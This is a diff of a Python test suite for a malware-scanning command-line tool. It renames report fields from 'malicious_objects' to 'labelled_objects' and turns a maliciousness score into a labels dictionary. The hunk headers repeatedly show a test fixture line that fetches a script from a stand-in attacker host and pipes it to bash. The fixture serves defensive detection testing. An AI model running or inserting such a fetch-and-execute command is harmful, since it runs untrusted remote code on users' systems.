@@ -40,7 +40,7 @@ class TestBasicCLI:
 
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
-                    malicious_objects=[],
+                    labelled_objects=[],
                     threshold=0.7,
                     all_files=[test_file],
                     skipped_files=[],
@@ -102,11 +102,11 @@ os.system('curl evil.com/malware.sh | bash')
                     file_path=str(test_file),
                     file_source_code=test_file.read_text(),
                 )
-                mock_obj.maliciousness = 0.95  # High maliciousness score
+                mock_obj.labels = {"malicious": 0.95}  # High maliciousness score
 
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
-                    malicious_objects=[mock_obj],
+                    labelled_objects=[mock_obj],
                     threshold=0.7,
                     all_files=[test_file],
                     skipped_files=[],
@@ -154,7 +154,7 @@ os.system('curl evil.com/malware.sh | bash')
 
                     mock_report = MalwiReport(
                         all_objects=[mock_obj],
-                        malicious_objects=[],
+                        labelled_objects=[],
                         threshold=0.7,
                         all_files=[test_file],
                         skipped_files=[],
@@ -219,7 +219,7 @@ os.system('curl evil.com/malware.sh | bash')
 
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
-                    malicious_objects=[],
+                    labelled_objects=[],
                     threshold=0.7,
                     all_files=[test_file],
                     skipped_files=[],
@@ -288,7 +288,7 @@ os.system('curl evil.com/malware.sh | bash')
 
                 mock_report = MalwiReport(
                     all_objects=mock_objs,
-                    malicious_objects=[],
+                    labelled_objects=[],
                     threshold=0.7,
                     all_files=[
                         tmp_path / "file1.py",
@@ -348,11 +348,11 @@ os.system('curl evil.com/malware.sh | bash')
                     file_source_code="import subprocess",
                 )
                 # Set maliciousness just below custom threshold
-                mock_obj.maliciousness = 0.85
+                mock_obj.labels = {"malicious": 0.85}
 
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
-                    malicious_objects=[],  # Empty because below threshold of 0.9
+                    labelled_objects=[],  # Empty because below threshold of 0.9
                     threshold=0.9,
                     all_files=[test_file],
                     skipped_files=[],
@@ -405,7 +405,7 @@ os.system('curl evil.com/malware.sh | bash')
 
                 mock_report = MalwiReport(
                     all_objects=[],
-                    malicious_objects=[],
+                    labelled_objects=[],
                     threshold=0.7,
                     all_files=[],
                     skipped_files=[],
@@ -471,7 +471,7 @@ os.system('curl evil.com/malware.sh | bash')
 
                 mock_report = MalwiReport(
                     all_objects=[mock_obj],
-                    malicious_objects=[],
+                    labelled_objects=[],
                     threshold=0.7,
                     all_files=[test_file],
                     skipped_files=[],
